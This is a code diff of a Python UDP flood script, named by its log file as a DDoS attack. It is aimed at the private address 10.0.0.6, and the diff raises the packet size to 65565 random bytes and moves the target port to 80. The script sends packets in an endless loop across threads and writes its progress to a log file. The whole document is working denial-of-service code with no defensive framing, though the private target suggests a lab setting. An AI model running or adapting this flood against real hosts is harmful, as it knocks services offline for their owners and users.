@@ -8,16 +8,18 @@ from locale import str
 
 # ip = str("")
 # port = int(80)/
+# if hyperthreaeding = true, thread # = 2 x cores
 
 ip = "10.0.0.6"
-port = 5000
+port = 80
 choice = "UDP"
-times = 1
-threads = 10
+times = 4
+threads = 4
+file_txt = open("attack_DDoS.txt", 'a')
 
 
 def floodUDP():
-    data = random._urandom(1024)
+    data = random._urandom(65565)
     j = True
     while True:
         try:
@@ -26,10 +28,11 @@ def floodUDP():
             for x in range(times):
                 s.sendto(data, address)
                 if j == True:
-                    print("Sent packets.")
+                    file_txt.writelines("Sent packets.")
                     j = False
         except Exception as e:
-            print(e)
+            file_txt.writelines(e)
+            file_txt.writelines("\n")
             break
 
 
